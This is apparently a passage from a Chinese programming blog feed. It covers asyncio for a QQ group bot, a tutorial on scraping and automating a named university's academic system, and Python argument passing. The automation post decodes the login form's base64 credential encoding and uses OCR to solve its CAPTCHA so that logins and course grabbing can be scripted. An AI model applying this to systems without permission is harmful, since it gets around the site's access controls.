<h3 id="2-2-并发处理单个群"><a href="#2-2-并发处理单个群" class="headerlink" title="2.2 并发处理单个群"></a>2.2 并发处理单个群</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">_process_single_group</span>(<span class="params">self, group_id, user_list, dm, result_msgs</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 发送扫描提示</span></span><br><span class="line">        <span class="keyword">await</span> send_private_msg(...)</span><br><span class="line">        <span class="keyword">await</span> asyncio.sleep(<span class="number">0.05</span>)  <span class="comment"># 释放控制权</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 处理用户验证</span></span><br><span class="line">        <span class="keyword">for</span> user_id, warning_count, code <span class="keyword">in</span> user_list:</span><br><span class="line">            <span class="comment"># 处理逻辑</span></span><br><span class="line">            <span class="keyword">await</span> asyncio.sleep(<span class="number">0.05</span>)</span><br></pre></td></tr></table></figure></div>

<h2 id="3-关键概念解析"><a href="#3-关键概念解析" class="headerlink" title="3. 关键概念解析"></a>3. 关键概念解析</h2><h3 id="3-1-事件循环（Event-Loop）"><a href="#3-1-事件循环（Event-Loop）" class="headerlink" title="3.1 事件循环（Event Loop）"></a>3.1 事件循环（Event Loop）</h3><p>事件循环是异步编程的核心，它负责调度和执行协程。当协程遇到<code>await</code>时，会释放控制权给事件循环，允许其他协程执行。</p>
<h3 id="3-2-并发-vs-并行"><a href="#3-2-并发-vs-并行" class="headerlink" title="3.2 并发 vs 并行"></a>3.2 并发 vs 并行</h3><ul>
<li><strong>并发</strong>：多个任务交替执行</li>
<li><strong>并行</strong>：多个任务同时执行</li>
</ul>
<p>在 Python 中，由于 GIL（全局解释器锁）的存在，我们主要实现并发而不是并行。</p>
<h3 id="3-3-共享资源处理"><a href="#3-3-共享资源处理" class="headerlink" title="3.3 共享资源处理"></a>3.3 共享资源处理</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">result_msgs = []  <span class="comment"># 共享的结果列表</span></span><br></pre></td></tr></table></figure></div>

<p>多个协程共享资源时，需要确保线程安全。在这个例子中，列表的<code>append</code>操作是原子的，所以是安全的。</p>
<h2 id="4-性能优化"><a href="#4-性能优化" class="headerlink" title="4. 性能优化"></a>4. 性能优化</h2><h3 id="4-1-I-O-操作优化"><a href="#4-1-I-O-操作优化" class="headerlink" title="4.1 I&#x2F;O 操作优化"></a>4.1 I&#x2F;O 操作优化</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 这些操作都是I/O密集型的</span></span><br><span class="line"><span class="keyword">await</span> send_private_msg(...)  <span class="comment"># 发送消息</span></span><br><span class="line"><span class="keyword">await</span> send_group_msg(...)    <span class="comment"># 发送群消息</span></span><br><span class="line"><span class="keyword">await</span> set_group_kick(...)    <span class="comment"># 踢人操作</span></span><br></pre></td></tr></table></figure></div>

<p>通过异步处理，这些 I&#x2F;O 操作不会阻塞其他任务。</p>
<h3 id="4-2-控制权释放"><a href="#4-2-控制权释放" class="headerlink" title="4.2 控制权释放"></a>4.2 控制权释放</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> asyncio.sleep(<span class="number">0.05</span>)  <span class="comment"># 释放控制权</span></span><br></pre></td></tr></table></figure></div>

<p>适当的控制权释放可以确保系统响应性。</p>
<h2 id="5-错误处理"><a href="#5-错误处理" class="headerlink" title="5. 错误处理"></a>5. 错误处理</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 并发操作</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    logger.error(<span class="string">f&quot;[<span class="subst">&#123;MODULE_NAME&#125;</span>]处理扫描入群验证失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>每个协程都有自己的错误处理，确保一个协程的错误不会影响其他协程。</p>
<h2 id="6-最佳实践"><a href="#6-最佳实践" class="headerlink" title="6. 最佳实践"></a>6. 最佳实践</h2><ol>
<li>合理使用<code>asyncio.sleep()</code>释放控制权</li>
<li>确保共享资源的线程安全</li>
<li>适当的错误处理</li>
<li>避免 CPU 密集型操作阻塞事件循环</li>
</ol>
<h2 id="7-总结"><a href="#7-总结" class="headerlink" title="7. 总结"></a>7. 总结</h2><p>通过使用 Python 的异步编程特性，我们可以实现高效的群聊验证系统。主要优势包括：</p>
<ul>
<li>提高 I&#x2F;O 密集型操作的效率</li>
<li>避免单个群处理阻塞其他群的处理</li>
<li>保持代码的可读性和可维护性</li>
<li>合理利用系统资源</li>
</ul>
<h2 id="8-注意事项"><a href="#8-注意事项" class="headerlink" title="8. 注意事项"></a>8. 注意事项</h2><ol>
<li>异步编程主要适用于 I&#x2F;O 密集型操作</li>
<li>对于 CPU 密集型操作，考虑使用多进程</li>
<li>注意内存使用，避免创建过多协程</li>
<li>合理设置超时和重试机制</li>
</ol>
<h2 id="9-扩展阅读"><a href="#9-扩展阅读" class="headerlink" title="9. 扩展阅读"></a>9. 扩展阅读</h2><ul>
<li><a class="link"   href="https://docs.python.org/3/library/asyncio.html" >Python asyncio 官方文档<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   href="https://docs.python.org/3/library/asyncio-dev.html" >Python 异步编程最佳实践<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
</ul>
<p>希望这篇教程能帮助你理解 Python 异步编程在群聊验证系统中的应用。如果你有任何问题，欢迎在评论区讨论！</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>异步编程</tag>
        <tag>并发处理</tag>
      </tags>
  </entry>
  <entry>
    <title>Python爬虫、自动化脚本与QQ机器人</title>
    <url>/posts/f6c10002.html</url>
    <content><![CDATA[<h2 id="安全声明"><a href="#安全声明" class="headerlink" title="安全声明"></a>安全声明</h2><p><strong>重要：</strong> 本课程内容仅限于学习、研究和技术交流目的，在 <strong>授权或公开</strong> 的网络资源上进行测试。</p>
<ul>
<li><strong>请勿</strong> 对未授权的网站或系统进行爬取或自动化操作。</li>
<li><strong>请勿</strong> 将所学技术用于任何非法用途或商业牟利。</li>
<li><strong>请遵守</strong> 目标网站的 <code>robots.txt</code> 协议和用户协议。</li>
<li><strong>合理控制</strong> 请求频率，避免对目标服务器造成过大负担。（DDoS 攻击）</li>
</ul>
<p><strong>任何滥用技术导致的法律责任或后果，均由使用者自行承担。</strong></p>
<hr>
<h2 id="引言：我们今天要探讨什么？"><a href="#引言：我们今天要探讨什么？" class="headerlink" title="引言：我们今天要探讨什么？"></a>引言：我们今天要探讨什么？</h2><ul>
<li><strong>Python 爬虫 (Web Crawler&#x2F;Spider):</strong> 自动获取网络信息的“数据矿工”。</li>
<li><strong>自动化脚本 (Automation Script&#x2F;Bot):</strong> 模拟人类操作的“智能助手”。</li>
<li>它们之间的联系与区别。</li>
<li>为什么 Python 是实现这些功能的有力工具？</li>
</ul>
<hr>
<h2 id="什么是-Python-爬虫？"><a href="#什么是-Python-爬虫？" class="headerlink" title="什么是 Python 爬虫？"></a>什么是 Python 爬虫？</h2><ul>
<li><p><strong>定义:</strong> 使用 Python 编程语言编写的、用于 <strong>自动、系统性地</strong> 从互联网上 <strong>获取（抓取）</strong> 网页信息的程序或脚本。</p>
<ul>
<li>想象一下“网络蜘蛛”（Spider）在“万维网”（Web）上按照一定规则爬行，收集信息。</li>
</ul>
</li>
<li><p><strong>主要目的:</strong></p>
<ul>
<li><strong>数据采集:</strong> 如市场价格、新闻资讯、用户评论等。</li>
<li><strong>信息整合:</strong> 如聚合内容、制作索引（搜索引擎核心）。</li>
<li><strong>数据分析:</strong> 为后续的数据分析、挖掘提供原始数据。</li>
</ul>
</li>
<li><p><strong>为什么用 Python?</strong></p>
<ul>
<li><strong>语法简洁，易于上手:</strong> 开发效率高。</li>
<li><strong>强大的第三方库生态:</strong><ul>
<li><code>requests</code>: 方便地发送 HTTP 网络请求。</li>
<li><code>BeautifulSoup</code>, <code>lxml</code>: 高效地解析 HTML&#x2F;XML 文档，提取数据。</li>
<li><code>Scrapy</code>: 强大的异步爬虫框架，适合大型项目。</li>
</ul>
</li>
<li><strong>活跃的社区:</strong> 容易找到学习资源和解决方案。</li>
</ul>
</li>
</ul>
<hr>
<h2 id="什么是自动化脚本？"><a href="#什么是自动化脚本？" class="headerlink" title="什么是自动化脚本？"></a>什么是自动化脚本？</h2><ul>
<li><p><strong>定义:</strong> 使用编程语言（如 Python）编写的，用于 <strong>模拟人类用户</strong> 与计算机系统（尤其是 Web 界面）进行交互，以 <strong>自动完成特定、重复性任务</strong> 的程序。</p>
</li>
<li><p><strong>主要目的:</strong></p>
<ul>
<li><strong>任务自动化:</strong> 替代手动执行繁琐、耗时的操作。</li>
<li><strong>效率提升:</strong> 例如，在特定时间点快速完成抢课、抢票、签到等。</li>
<li><strong>流程执行:</strong> 自动登录、填写表单、点击按钮、提交数据等。</li>
</ul>
</li>
<li><p><strong>与爬虫的联系:</strong></p>
<ul>
<li>通常也需要与 Web 服务器进行交互（发送请求、接收响应）。</li>
<li>可能使用与爬虫相同的库（如 <code>requests</code>, <code>Selenium</code>）。</li>
<li><code>Selenium</code> 这类浏览器自动化工具在复杂交互脚本中尤其常用。</li>
</ul>
</li>
</ul>
<hr>
<h2 id="爬虫-vs-自动化脚本：核心区别"><a href="#爬虫-vs-自动化脚本：核心区别" class="headerlink" title="爬虫 vs. 自动化脚本：核心区别"></a>爬虫 vs. 自动化脚本：核心区别</h2><table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left">Python 爬虫</th>
<th align="left">自动化脚本 (Bot)</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>核心目标</strong></td>
<td align="left"><strong>数据获取</strong> (Information Retrieval)</td>
<td align="left"><strong>任务执行</strong> (Task Execution)</td>
</tr>
<tr>
<td align="left"><strong>主要操作</strong></td>
<td align="left">读取网页内容 (Read)</td>
<td align="left">模拟用户交互 (Interact&#x2F;Write)</td>
</tr>
<tr>
<td align="left"><strong>范围</strong></td>
<td align="left">通常较广，可能遍历多个页面&#x2F;网站</td>
<td align="left">通常较窄，针对特定流程&#x2F;任务</td>
</tr>
<tr>
<td align="left"><strong>侧重点</strong></td>
<td align="left">高效下载、解析、存储数据</td>
<td align="left">精确模拟操作、处理登录状态、提交数据</td>
</tr>
</tbody></table>
<p><strong>简单来说：爬虫侧重于“看”和“存”，自动化脚本侧重于“做”和“交互”。</strong></p>
<h2 id="Python-爬虫案例演示"><a href="#Python-爬虫案例演示" class="headerlink" title="Python 爬虫案例演示"></a>Python 爬虫案例演示</h2><p>由于之前学期大家都选修了 Python 课程，期末大作业就是爬虫作业，这里不过多解释</p>
<h2 id="Python-自动化脚本案例演示——以学校某系统为例"><a href="#Python-自动化脚本案例演示——以学校某系统为例" class="headerlink" title="Python 自动化脚本案例演示——以学校某系统为例"></a>Python 自动化脚本案例演示——以学校某系统为例</h2><h3 id="核心知识点"><a href="#核心知识点" class="headerlink" title="核心知识点"></a>核心知识点</h3><p><strong>涉及的关键知识点：</strong></p>
<ul>
<li><strong>HTTP 基础:</strong><ul>
<li>理解 GET 和 POST 请求的区别。</li>
<li>了解请求头 (Headers)、Cookies、表单数据 (Form Data) 的作用。</li>
</ul>
</li>
<li><strong>浏览器开发者工具 (F12):</strong><ul>
<li><strong>元素审查 (Inspect Element):</strong> 定位 HTML 元素，获取其 ID, Name, Class, XPath, CSS Selector 等定位符。</li>
<li><strong>网络分析 (Network Tab):</strong> 查看实际的网络请求过程（URL, 请求方法, Headers, Payload, 响应内容），分析登录、提交等关键操作的请求细节。</li>
</ul>
</li>
<li><strong>核心 Python 库:</strong><ul>
<li><strong><code>requests</code> 库:</strong><ul>
<li>发送 GET&#x2F;POST 请求 (<code>requests.get</code>, <code>requests.post</code>)。</li>
<li>管理会话 (<code>requests.Session</code>) 以保持登录状态 (自动处理 Cookies)。</li>
<li>定制请求头 (Headers)。</li>
<li>提交表单数据。</li>
</ul>
</li>
<li><strong><code>Selenium</code> 库 (用于复杂交互或 JavaScript 渲染页面):</strong><ul>
<li>WebDriver 的安装与配置 (如 ChromeDriver)。</li>
<li>启动和控制浏览器 (<code>webdriver.Chrome()</code>)。</li>
<li>定位页面元素 (<code>find_element</code>)。</li>
<li>模拟用户操作 (输入 <code>send_keys</code>, 点击 <code>click</code>, 选择下拉框等)。</li>
<li>处理页面等待 (<code>implicitly_wait</code>, <code>WebDriverWait</code>, <code>expected_conditions</code>)。</li>
<li>执行 JavaScript 脚本 (<code>execute_script</code>)。</li>
</ul>
</li>
</ul>
</li>
<li><strong>HTML&#x2F;XML 解析 (可选，若需从页面提取信息):</strong><ul>
<li><strong><code>BeautifulSoup</code> 或 <code>lxml</code>:</strong> 解析 <code>requests</code> 获取的 HTML 内容，或 <code>Selenium</code> 获取的 <code>page_source</code>，提取状态信息或下一步操作所需数据。</li>
</ul>
</li>
<li><strong>登录与认证处理:</strong><ul>
<li>分析登录请求 (通常是 POST 请求)。</li>
<li>构造登录所需的表单数据。</li>
<li>处理验证码 (简单的图形验证码可尝试 OCR 库如 <code>ddddocr</code>，复杂的交互式验证码是难点)。</li>
</ul>
</li>
<li><strong>模拟操作流程:</strong><ul>
<li>根据手动操作步骤，将每一步转化为代码实现 (访问特定 URL、填写表单、点击按钮)。</li>
<li>处理页面跳转和导航逻辑。</li>
</ul>
</li>
<li><strong>异常处理:</strong><ul>
<li>使用 <code>try...except</code> 语句处理网络错误、元素找不到、登录失败等异常情况，增强脚本健壮性。</li>
</ul>
</li>
<li><strong>配置与参数化:</strong><ul>
<li>将用户名、密码、目标 URL 等信息存储在配置文件或变量中，而不是硬编码在代码里。</li>
</ul>
</li>
<li><strong>频率控制与道德规范:</strong><ul>
<li>使用 <code>time.sleep()</code> 添加适当延时，避免对服务器造成过大压力。</li>
<li>再次强调遵守学校系统使用规定。</li>
</ul>
</li>
</ul>
<h3 id="案例-1——教务处公告监控"><a href="#案例-1——教务处公告监控" class="headerlink" title="案例 1——教务处公告监控"></a>案例 1——教务处公告监控</h3><p>以 <a class="link"   href="https://jwc.qfnu.edu.cn/tz_j_.htm#/" >通知（旧）-曲阜师范大学教务处<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 为例</p>
<p>要想监控教务处公告，首先进入到教务处公告页面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-21d3a0089b14a1f40e3a8321cdad9db6.png"
                      alt="公告页面"
                ></p>
<p>打开 F12 元素审查，可以定位到公告的主体元素</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-7177b3d69aab66436e88e4aec80abddb.png"
                      alt="元素审查"
                ></p>
<p>接下来就有思路了，我们可以每隔一段时间，运行脚本，获取并保存这部分元素的内容，当检测到获取的内容和保存的内容有变化，这时候就说明教务处有新内容了</p>
<p>借助 <code>requests</code> 库，我们可以很方便地发送 HTTP 请求，获取网页内容，然后使用 <code>BeautifulSoup</code> 库解析网页内容，提取出公告的主体元素</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-7a1372a71a8b6df234bc0df317d22c95.png"
                      alt="获取网页内容函数代码"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-2b070bd562df59d0789f62cf8cbeec0c.png"
                      alt="解析网页内容提取公告信息"
                ></p>
<p>监控已经有了，如何实现提醒呢，可以接入飞书机器人、钉钉机器人、QQ 机器人等主动推送</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-b67e1b4f75ed08fdf1e4706247e9a217.png"
                      alt="QQ 机器人推送演示"
                ></p>
<h3 id="案例-2——教务系统模拟登录"><a href="#案例-2——教务系统模拟登录" class="headerlink" title="案例 2——教务系统模拟登录"></a>案例 2——教务系统模拟登录</h3><p>以 <a class="link"   href="http://zhjw.qfnu.edu.cn/jsxsd" >http://zhjw.qfnu.edu.cn/jsxsd<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 地址为例</p>
<p>为什么要强调一下这个地址呢，因为教务系统写的很乱，<code>jsxsd</code> 这个路径有没有，直接影响验证码路径地址，直接影响登录请求</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-bd9a534a0d9d6149031e4d37b26b1149.png"
                      alt="分析页面"
                ></p>
<p>通过分析可得，登录按钮点击会触发一个 <code>onclick</code> 事件，按钮会调用一个 <code>login</code> 函数，表单会触发一个 <code>onsubmit</code> 事件，事件会调用一个 <code>submitForm1</code> 函数</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-89a1855304c13c3895b6981a4103fba5.png"
                      alt="image-20250506201933395"
                ></p>
<p>实测发现 <code>login</code> 这个函数不重要，他可能是与 <code>submitForm1</code> 协同工作的，我们只需要关注 <code>submitForm1</code> 函数</p>
<p>下面分析 <code>submitForm1</code> 函数</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-b9b5091242b52d20d328960ded4c1baa.png"
                      alt="分析 submitForm1 函数"
                ></p>
<p>这段代码主要做了以下几件事：</p>
<ol>
<li>获取用户名和密码</li>
<li>如果用户名和密码为空，则弹出提示框，并返回 false</li>
<li>如果用户名和密码不为空，则将用户名和密码进行编码，编码方式为 <code>encodeInp</code> 函数</li>
<li>将编码后的用户名和密码存储到 <code>encoded</code> 元素中</li>
<li>将 <code>encoded</code> 元素的值存储到 <code>jzmmid</code> 元素中</li>
<li>清空密码框的值</li>
<li>如果 <code>LoginToXkLdap</code> 不等于 <code>logonLdap</code>，则清空用户名和密码框的值</li>
<li>返回 true</li>
</ol>
<p>经过搜索找到了 encoded，但是代码被混淆了，反混淆之后就是一个 base64 编码，其实很简单，不反混淆也可以通过下面的抓包猜出来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-7741ff15b0d06469936f011b37022570.png"
                      alt="encoded 函数"
                ></p>
<p>原始请求包：</p>
<div class="code-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/jsxsd/xk/LoginToXkLdap</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>zhjw.qfnu.edu.cn</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>98</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://zhjw.qfnu.edu.cn</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://zhjw.qfnu.edu.cn/jsxsd/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX; sto-id-20480=XXXXXXXXXXXX; JSESSIONID=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">userAccount</span>=&amp;userPassword=&amp;RANDOMCODE=xxxx&amp;encoded=XXXXXXXXXX%<span class="number">3</span>D%<span class="number">3</span>D%<span class="number">25</span>%<span class="number">25</span>%<span class="number">25</span>XXXXXXXXXX%<span class="number">3</span>D</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-1095eef385ed4105bc599c83bf751098.png"
                      alt="抓包"
                ></p>
<p>经过分析得到，<code>userAccount</code> 和 <code>userPassword</code> 是用户名和密码，<code>RANDOMCODE</code> 是验证码，<code>encoded</code> 是经过编码的用户名和密码</p>
<p>验证码可以通过 <code>ddddocr</code> 库识别，识别之后，将验证码和用户名和密码 base64 编码拼接，就可以模拟请求发送给服务器了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-ab82672ad38269aba352abfe1384c42c.png"
                      alt="模拟登录代码"
                ></p>
<p>模拟登录成功之后，就可以获取到教务系统的数据了，比如课表、成绩、个人信息等，自动抢课等都是可以实现的</p>
<p>这个系统的代码写的很乱，一个就是一开始那个验证码的路径写了两个地方不统一，另一个就是 API 接口以及变量命名很乱，没有可读性，截取一部分代码给大家看看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-4c79845965c118998cedfb4b6a81f862.png"
                      alt="公选课请求包"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-9d133092a085222e8704d9e6b5510d80.png"
                      alt="请求选课列表数据"
                ></p>
<h3 id="案例-3——基于教务系统接入-QQ-机器人查询无课教室"><a href="#案例-3——基于教务系统接入-QQ-机器人查询无课教室" class="headerlink" title="案例 3——基于教务系统接入 QQ 机器人查询无课教室"></a>案例 3——基于教务系统接入 QQ 机器人查询无课教室</h3><p>由于智慧曲园的无课教室查询只有曲阜老校区，并且智慧曲园时不时还崩掉，天天进教务系统看还很麻烦，于是自己写一个接入到 QQ 里</p>
<p>核心思路就是利用查到的有课教室，然后从所有教室里排除有课的教室，剩下的就是无课的教室</p>
<h4 id="模拟登录（案例-2-已经演示完成）"><a href="#模拟登录（案例-2-已经演示完成）" class="headerlink" title="模拟登录（案例 2 已经演示完成）"></a>模拟登录（案例 2 已经演示完成）</h4><h4 id="查询有课教室"><a href="#查询有课教室" class="headerlink" title="查询有课教室"></a>查询有课教室</h4><p>通过抓包得到请求包的内容以及返回内容</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-d1a03bd34f5a3abcbbd4545637f27958.png"
                      alt="查询有课教室请求包"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-fdd18e9f830e4b43cf7a27c735e11497.png"
                      alt="返回内容"
                ></p>
<p>可以看到返回内容是一套 HTML，通过 BeautifulSoup 解析之后，可以得到教室列表</p>
<h4 id="接入-QQ-机器人"><a href="#接入-QQ-机器人" class="headerlink" title="接入 QQ 机器人"></a>接入 QQ 机器人</h4><p>接入 QQ 机器人之后就可以查无课教室了，对考研党很友好</p>
<p>并且我对搜索逻辑进行了优化，支持指定天数，范围节次</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-f656922cb4d88e285fd24a82458418d6.png"
                      alt="查询空教室"
                ></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>爬虫</tag>
        <tag>自动化</tag>
        <tag>QQ机器人</tag>
      </tags>
  </entry>
  <entry>
    <title>Python的函数传参规则</title>
    <url>/posts/de3b9b4c.html</url>
    <content><![CDATA[<h2 id="1-核心传递机制"><a href="#1-核心传递机制" class="headerlink" title="1. 核心传递机制"></a>1. 核心传递机制</h2><ul>
<li><strong>按对象引用传递</strong><ul>
<li>传递对象的引用（非拷贝）</li>
<li>可变对象（列表&#x2F;字典）在函数内修改会影响原对象</li>
<li>不可变对象（数字&#x2F;字符串）修改会创建新对象</li>
</ul>
</li>
</ul>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">modify</span>(<span class="params">obj</span>):</span><br><span class="line">    obj.append(<span class="number">1</span>) <span class="keyword">if</span> <span class="built_in">isinstance</span>(obj, <span class="built_in">list</span>) <span class="keyword">else</span> <span class="built_in">print</span>(<span class="string">&quot;不可变对象&quot;</span>)</span><br><span class="line"></span><br><span class="line">lst = [<span class="number">0</span>]</span><br><span class="line">modify(lst)  <span class="comment"># lst变为[0, 1]</span></span><br></pre></td></tr></table></figure></div>

<h2 id="2-参数匹配规则"><a href="#2-参数匹配规则" class="headerlink" title="2. 参数匹配规则"></a>2. 参数匹配规则</h2><h3 id="两种传递方式"><a href="#两种传递方式" class="headerlink" title="两种传递方式"></a>两种传递方式</h3><table>
<thead>
<tr>
<th>方式</th>
<th>匹配规则</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>位置参数</td>
<td>严格按定义顺序匹配</td>
<td><code>func(1, 2)</code> → a&#x3D;1, b&#x3D;2</td>
</tr>
<tr>
<td>关键字参数</td>
<td>按参数名匹配（顺序无关）</td>
<td><code>func(b=2, a=1)</code> → a&#x3D;1, b&#x3D;2</td>
</tr>
</tbody></table>
<h3 id="关键特性"><a href="#关键特性" class="headerlink" title="关键特性"></a>关键特性</h3><ul>
<li>变量名是否相同<strong>不影响</strong>参数传递</li>
<li>混合使用时：位置参数必须在前</li>
</ul>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">func(<span class="number">1</span>, b=<span class="number">2</span>)  <span class="comment"># 合法</span></span><br><span class="line">func(a=<span class="number">1</span>, <span class="number">2</span>)  <span class="comment"># SyntaxError</span></span><br></pre></td></tr></table></figure></div>

<h2 id="3-参数类型总结"><a href="#3-参数类型总结" class="headerlink" title="3. 参数类型总结"></a>3. 参数类型总结</h2><h3 id="四种参数类型"><a href="#四种参数类型" class="headerlink" title="四种参数类型"></a>四种参数类型</h3><ol>
<li><strong>位置参数</strong><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">a, b</span>): <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></div></li>
<li><strong>默认参数</strong><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">a=<span class="number">1</span>, b=<span class="number">2</span></span>): <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></div></li>
<li><strong>可变位置参数</strong> (<code>*args</code>)<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">*args</span>):  <span class="comment"># 接收为元组</span></span><br></pre></td></tr></table></figure></div></li>
<li><strong>可变关键字参数</strong> (<code>**kwargs</code>)<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">**kwargs</span>):  <span class="comment"># 接收为字典</span></span><br></pre></td></tr></table></figure></div></li>
</ol>
<h2 id="4-易混淆场景解析"><a href="#4-易混淆场景解析" class="headerlink" title="4. 易混淆场景解析"></a>4. 易混淆场景解析</h2><h3 id="场景-1：顺序影响"><a href="#场景-1：顺序影响" class="headerlink" title="场景 1：顺序影响"></a>场景 1：顺序影响</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">demo</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;a=<span class="subst">&#123;a&#125;</span>, b=<span class="subst">&#123;b&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">x, y = <span class="number">10</span>, <span class="number">20</span></span><br><span class="line">demo(y, x)  <span class="comment"># 输出: a=20, b=10（纯位置传递）</span></span><br></pre></td></tr></table></figure></div>

<h3 id="场景-2：关键字参数无视顺序"><a href="#场景-2：关键字参数无视顺序" class="headerlink" title="场景 2：关键字参数无视顺序"></a>场景 2：关键字参数无视顺序</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">demo(b=y, a=x)  <span class="comment"># 输出: a=10, b=20</span></span><br></pre></td></tr></table></figure></div>

